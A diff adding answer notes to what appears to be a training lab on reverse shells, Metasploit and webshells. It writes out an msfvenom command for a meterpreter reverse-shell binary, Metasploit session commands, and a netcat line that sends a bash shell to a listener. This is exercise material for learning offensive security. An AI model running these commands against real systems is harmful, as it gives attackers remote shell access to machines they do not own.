@@ -65,3 +65,24 @@
 	- `_`
 
 - What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
+	- `msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`
+
+- What command can be used to start a listener in the background?
+
+	- `exploit -j`
+
+- If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
+
+	- `sessions 10`
+
+- Read the WebShells information.
+
+	  no answer needed
+
+- Read the above information
+
+	  no answer needed
+
+- Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.
+
+	  no answer needed
